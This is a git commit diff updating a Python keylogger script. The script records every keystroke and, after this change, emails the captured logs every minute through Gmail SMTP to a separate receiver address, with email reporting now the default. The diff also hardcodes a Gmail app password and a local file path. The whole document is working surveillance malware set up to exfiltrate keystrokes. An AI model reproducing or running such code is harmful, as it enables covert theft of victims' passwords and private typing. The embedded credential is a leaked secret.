01c153c4dc2c70be8fa018d09e5670bfd6c9c9e6
Virendra Ukey <vukey@qualys.com>
2021-04-30 09:35:38 +0530

    update keylogger script

--- keylogger.py
+++ keylogger.py
@@ -1,12 +1,17 @@
 import keyboard  # for keylogs
-import smtplib  # for sending email using SMTP protocol (gmail)
+import smtplib, ssl  # for sending email using SMTP protocol (gmail)
 # Timer is to make a method runs after an `interval` amount of time
 from threading import Timer
 from datetime import datetime
 
 SEND_REPORT_EVERY = 60  # in seconds, 60 means 1 minute and so on
-EMAIL_ADDRESS = "<email>@gmail.com"
-EMAIL_PASSWORD = "pass"
+file_path = "D:\\Personal\\keylog\\"
+smtp_server = "smtp.gmail.com"
+port = 587  # For starttls
+EMAIL_ADDRESS = "sender@gmail.com"
+receiver_email = "reciever@gmail.com"  # Enter receiver address
+#Following is app password that need to be generated on gmail
+EMAIL_PASSWORD = "zbrkksexjjvkic"
 
 
 class Keylogger:
@@ -55,22 +60,18 @@ class Keylogger:
         """This method creates a log file in the current directory that contains
         the current keylogs in the `self.log` variable"""
         # open the file in write mode (create it)
-        with open(f"{self.filename}.txt", "w") as f:
+        with open(file_path+f"{self.filename}.txt", "w") as f:
             # write the keylogs to the file
             print(self.log, file=f)
         print(f"[+] Saved {self.filename}.txt")
 
     def sendmail(self, email, password, message):
-        # manages a connection to an SMTP server
-        server = smtplib.SMTP(host="smtp.gmail.com", port=587)
-        # connect to the SMTP server as TLS mode ( for security )
-        server.starttls()
-        # login to the email account
-        server.login(email, password)
-        # send the actual message
-        server.sendmail(email, email, message)
-        # terminates the session
-        server.quit()
+       context = ssl.create_default_context()
+       with smtplib.SMTP(smtp_server, port) as server:
+            server.starttls(context=context)
+            server.ehlo()  # Can be omitted
+            server.login(email, password)
+            server.sendmail(email, receiver_email, message)
 
     def report(self):
         """
@@ -112,5 +113,5 @@ if __name__ == "__main__":
     # keylogger = Keylogger(interval=SEND_REPORT_EVERY, report_method="email")
     # if you want a keylogger to record keylogs to a local file 
     # (and then send it using your favorite method)
-    keylogger = Keylogger(interval=SEND_REPORT_EVERY, report_method="file")
+    keylogger = Keylogger(interval=SEND_REPORT_EVERY, report_method="email")
     keylogger.start()
